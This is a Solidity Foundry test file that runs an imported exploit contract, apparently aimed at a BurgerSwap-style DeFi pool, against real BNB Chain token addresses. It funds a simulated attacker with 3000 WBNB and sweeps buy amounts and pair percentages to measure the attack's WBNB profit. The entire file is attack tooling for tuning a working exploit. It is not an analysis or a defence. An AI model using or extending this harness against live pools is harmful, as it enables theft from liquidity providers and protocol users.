// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest12 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function _runAttack(uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, 5000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 3000 ether}();
        IWBNB(WBNB).transfer(address(e), 3000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        e.fullAttack(BUSD, buyAmt, seedAmt, pairPct);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        vm.stopPrank();
        return int256(wbnbAfter) - int256(wbnbBefore);
    }

    function test_buy800_pct50() public {
        int256 d = _runAttack(800 ether, 20 ether, 50);
        emit log_named_int("buy800_pct50", d);
    }

    function test_buy800_pct40() public {
        int256 d = _runAttack(800 ether, 20 ether, 40);
        emit log_named_int("buy800_pct40", d);
    }

    function test_buy900_pct50() public {
        int256 d = _runAttack(900 ether, 20 ether, 50);
        emit log_named_int("buy900_pct50", d);
    }

    function test_buy750_pct50() public {
        int256 d = _runAttack(750 ether, 20 ether, 50);
        emit log_named_int("buy750_pct50", d);
    }

    function test_buy750_pct45() public {
        int256 d = _runAttack(750 ether, 20 ether, 45);
        emit log_named_int("buy750_pct45", d);
    }

    function test_buy700_pct45() public {
        int256 d = _runAttack(700 ether, 20 ether, 45);
        emit log_named_int("buy700_pct45", d);
    }

    function test_buy700_pct55() public {
        int256 d = _runAttack(700 ether, 20 ether, 55);
        emit log_named_int("buy700_pct55", d);
    }
}
